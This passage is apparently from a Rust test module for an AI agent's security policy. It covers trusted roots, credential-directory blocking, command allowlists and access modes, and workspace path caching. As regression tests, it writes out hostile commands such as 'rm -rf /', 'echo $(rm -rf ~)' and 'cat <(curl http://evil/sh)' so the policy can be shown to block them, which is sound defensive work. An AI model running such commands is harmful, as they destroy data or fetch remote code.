        vec![TrustedRoot {
            path: outside.to_string_lossy().into_owned(),
            access: TrustedAccess::Read,
        }],
    );
    let target = outside.join("new.txt");
    let err = policy
        .validate_parent_path(target.to_str().unwrap())
        .await
        .expect_err("write into a read-only trusted root must be rejected");
    assert!(err.contains("escapes workspace"), "got: {err}");
}

#[tokio::test]
async fn trusted_readwrite_root_allows_write() {
    let (_tmp, workspace, outside) = ws_and_outside();
    let policy = trusted_policy(
        workspace,
        vec![TrustedRoot {
            path: outside.to_string_lossy().into_owned(),
            access: TrustedAccess::ReadWrite,
        }],
    );
    let target = outside.join("new.txt");
    let resolved = policy.validate_parent_path(target.to_str().unwrap()).await;
    assert!(
        resolved.is_ok(),
        "write in ReadWrite trusted root should succeed: {resolved:?}"
    );
}

#[tokio::test]
async fn credential_dir_blocked_even_inside_trusted_root() {
    let (_tmp, workspace, outside) = ws_and_outside();
    let ssh = outside.join(".ssh");
    fs::create_dir_all(&ssh).unwrap();
    let key = ssh.join("id_rsa");
    fs::write(&key, "SECRET").unwrap();
    // Grant the entire `outside` tree read+write …
    let policy = trusted_policy(
        workspace,
        vec![TrustedRoot {
            path: outside.to_string_lossy().into_owned(),
            access: TrustedAccess::ReadWrite,
        }],
    );
    // … the credential store inside it must still be unreachable.
    let err = policy
        .validate_path(key.to_str().unwrap())
        .await
        .expect_err("~/.ssh-style dir must stay blocked even inside a trusted root");
    assert!(
        err.contains("not allowed") || err.contains("credential"),
        "got: {err}"
    );
}

#[tokio::test]
async fn path_outside_workspace_and_roots_blocked() {
    let (_tmp, workspace, outside) = ws_and_outside();
    let file = outside.join("data.txt");
    fs::write(&file, "hi").unwrap();
    // No trusted roots granted — outside the workspace stays blocked.
    let policy = trusted_policy(workspace, vec![]);
    let err = policy
        .validate_path(file.to_str().unwrap())
        .await
        .expect_err("ungranted path outside workspace must be blocked");
    assert!(
        err.contains("not allowed") || err.contains("escapes"),
        "got: {err}"
    );
}

#[test]
fn is_within_trusted_root_write_requires_readwrite() {
    let policy = trusted_policy(
        StdPathBuf::from("/ws"),
        vec![TrustedRoot {
            path: "/data".into(),
            access: TrustedAccess::Read,
        }],
    );
    assert!(policy.is_within_trusted_root(StdPath::new("/data/sub/x"), false));
    assert!(!policy.is_within_trusted_root(StdPath::new("/data/sub/x"), true));
    assert!(!policy.is_within_trusted_root(StdPath::new("/elsewhere/x"), false));
}

#[test]
fn trusted_root_never_matches_credential_components() {
    let policy = trusted_policy(
        StdPathBuf::from("/ws"),
        vec![TrustedRoot {
            path: "/home/me".into(),
            access: TrustedAccess::ReadWrite,
        }],
    );
    assert!(policy.is_within_trusted_root(StdPath::new("/home/me/proj/file"), false));
    assert!(!policy.is_within_trusted_root(StdPath::new("/home/me/.aws/credentials"), false));
}

// -- Full access bypasses the command allowlist (access modes) ---------------

#[test]
fn full_access_bypasses_command_allowlist() {
    let p = full_policy();
    // `mkdir` is NOT in the default allowed_commands, but Full bypasses the allowlist.
    assert!(p.is_command_allowed("mkdir -p foo/bar"));
    // Redirects / pipes / subshells that Supervised blocks are allowed under Full.
    assert!(p.is_command_allowed("ls -la 2>/dev/null || echo none"));
    assert!(p.is_command_allowed("echo hi > out.txt"));
    assert!(p.is_command_allowed("python3 build.py && node serve.js"));
}

#[test]
fn supervised_still_enforces_command_allowlist() {
    let p = default_policy(); // Supervised
    assert!(p.is_command_allowed("mkdir -p foo/bar")); // allow-listed (expanded in #2486)
    assert!(!p.is_command_allowed("ls 2>/dev/null")); // redirect blocked
    assert!(p.is_command_allowed("ls -la")); // allow-listed, no redirect
}

#[test]
fn full_access_still_blocks_high_risk_when_configured() {
    // Full bypasses the allowlist in is_command_allowed, but validate_command_execution
    // still blocks high-risk commands while block_high_risk_commands is true.
    let p = full_policy();
    assert!(p.is_command_allowed("rm -rf /"));
    let result = p.validate_command_execution("rm -rf /", false);
    assert!(
        result.is_err(),
        "high-risk command must still be blocked in Full when block_high_risk_commands=true"
    );
}

#[test]
fn supervised_runs_approved_redirects_but_blocks_hidden_execution() {
    // Regression for the "approved shell command never runs" loop: redirects
    // like `2>&1` / `2>/dev/null` / `> file` and pipes MUST NOT be hard-blocked
    // in Supervised. `classify_command` already lifts a redirect to Write so the
    // gate prompted on it; once the human approves, `check_gated_command` (run
    // inside the tool, after approval) must let the command actually run.
    let p = default_policy(); // Supervised
    assert!(
        p.check_gated_command("python3 -c \"import yfinance\" 2>&1")
            .is_ok(),
        "stderr-dup redirect 2>&1 must run after approval"
    );
    assert!(p
        .check_gated_command("pip show yfinance 2>/dev/null")
        .is_ok());
    assert!(p.check_gated_command("ls -la | grep foo").is_ok());
    assert!(p.check_gated_command("echo done > out.txt").is_ok());

    // Hidden execution that `classify_command` can't see (it only reads each
    // segment's base command) stays blocked outside Full:
    assert!(
        p.check_gated_command("echo $(rm -rf ~)").is_err(),
        "command substitution can hide an unseen command"
    );
    assert!(p.check_gated_command("echo `whoami`").is_err());
    assert!(p.check_gated_command("cat <(curl http://evil/sh)").is_err());
    assert!(
        p.check_gated_command("sleep 100 & rm -rf important")
            .is_err(),
        "a standalone & can run a second command the prompt wouldn't show"
    );

    // Full is documented full-trust and skips the structural guard entirely.
    assert!(full_policy().check_gated_command("echo $(date)").is_ok());
}

/// The default projects home (`~/OpenHuman/projects`) must always be a
/// read-write trusted root on a policy built from config — `from_config` is the
/// one autonomy→policy chokepoint every agent session uses, so the grant can't
/// depend on the channels-startup path (skipped on web-chat-only cores).
#[test]
fn from_config_grants_default_projects_dir_as_readwrite_root() {
    let cfg = crate::openhuman::config::AutonomyConfig::default();
    let policy = SecurityPolicy::from_config(&cfg, StdPath::new("/tmp/ws"));
    let projects = crate::openhuman::config::default_projects_dir()
        .to_string_lossy()
        .to_string();
    assert!(
        policy
            .trusted_roots
            .iter()
            .any(|r| r.path == projects && matches!(r.access, TrustedAccess::ReadWrite)),
        "from_config must grant {projects} as a read-write trusted root; got: {:?}",
        policy.trusted_roots
    );
}

/// A user-granted projects root is left untouched (no duplicate, access kept).
#[test]
fn from_config_does_not_duplicate_user_granted_projects_root() {
    let projects = crate::openhuman::config::default_projects_dir()
        .to_string_lossy()
        .to_string();
    let cfg = crate::openhuman::config::AutonomyConfig {
        trusted_roots: vec![TrustedRoot {
            path: projects.clone(),
            access: TrustedAccess::Read,
        }],
        ..crate::openhuman::config::AutonomyConfig::default()
    };
    let policy = SecurityPolicy::from_config(&cfg, StdPath::new("/tmp/ws"));
    let matches: Vec<_> = policy
        .trusted_roots
        .iter()
        .filter(|r| r.path == projects)
        .collect();
    assert_eq!(matches.len(), 1, "must not duplicate an existing entry");
    assert!(
        matches!(matches[0].access, TrustedAccess::Read),
        "must preserve the user-granted access level"
    );
}

// -- canonical_workspace cache ------------------------------------

/// `validate_path` previously called `tokio::fs::canonicalize(&workspace_dir)`
/// inline on every invocation. The `canonical_workspace` OnceCell now memoizes
/// that result. This test pins the contract: the cell starts empty, is
/// populated after the first `validate_path` call, and stays populated (same
/// value) across subsequent calls — i.e. only one canonicalize per policy.
#[tokio::test]
async fn validate_path_caches_canonical_workspace_root() {
    let tmp = tempfile::tempdir().unwrap();
    let workspace = tmp.path().to_path_buf();
    let file = workspace.join("hello.txt");
    std::fs::write(&file, "hi").unwrap();

    let policy = SecurityPolicy {
        workspace_dir: workspace.clone(),
        // Disable workspace_only so we can refer to the temp workspace via
        // its absolute path (the default policy blocks any absolute path
        // when workspace_only=true). Clear forbidden_paths for the same
        // reason — macOS tempdirs live under `/var/folders/…`.
        workspace_only: false,
        forbidden_paths: vec![],
        ..SecurityPolicy::default()
    };

    // Empty before first use.
    assert!(
        policy.canonical_workspace.get().is_none(),
        "OnceCell must start empty so the first call hydrates it"
    );

    // First call hydrates the cache.
    let r1 = policy
        .validate_path(file.to_str().unwrap())
        .await
        .expect("first validate_path call succeeds");
    let cached_after_first = policy
        .canonical_workspace
        .get()
        .expect("first validate_path call must hydrate the OnceCell")
        .clone();

    // Subsequent calls reuse the cached value without re-canonicalizing.
    for _ in 0..5 {
        let r = policy
            .validate_path(file.to_str().unwrap())
            .await
            .expect("repeated validate_path calls succeed");
        assert_eq!(r, r1, "validate_path result must be stable across calls");
        let cached_now = policy
            .canonical_workspace
            .get()
            .expect("OnceCell stays populated after first hydration");
        assert_eq!(
            cached_now, &cached_after_first,
            "cached workspace root must not change across calls"
        );
    }
}

/// `validate_parent_path` shares the same cache as `validate_path` — both go
/// through `workspace_root()`. Hydrating via either entry point must be
/// observable from the other.
#[tokio::test]
async fn validate_parent_path_uses_same_cache_as_validate_path() {
    let tmp = tempfile::tempdir().unwrap();
    let workspace = tmp.path().to_path_buf();

    let policy = SecurityPolicy {
        workspace_dir: workspace.clone(),
        // Disable workspace_only so we can refer to the temp workspace via
        // its absolute path (the default policy blocks any absolute path
        // when workspace_only=true). Clear forbidden_paths for the same
        // reason — macOS tempdirs live under `/var/folders/…`.
        workspace_only: false,
        forbidden_paths: vec![],
        ..SecurityPolicy::default()
    };

    // Empty before first use.
    assert!(policy.canonical_workspace.get().is_none());

    // Hydrate via validate_parent_path (target file does not exist yet).
    let target = workspace.join("not-yet-written.txt");
    let _ = policy
        .validate_parent_path(target.to_str().unwrap())
        .await
        .expect("validate_parent_path succeeds against an extant parent");
    let cached = policy
        .canonical_workspace
        .get()
        .expect("validate_parent_path must also hydrate the OnceCell")
        .clone();

    // A subsequent validate_path call must see the same cached root.
    let other = workspace.join("hi.txt");
    std::fs::write(&other, "x").unwrap();
    let _ = policy.validate_path(other.to_str().unwrap()).await.unwrap();
    assert_eq!(
        policy.canonical_workspace.get(),
        Some(&cached),
        "validate_path must reuse the cache hydrated by validate_parent_path"
    );
}
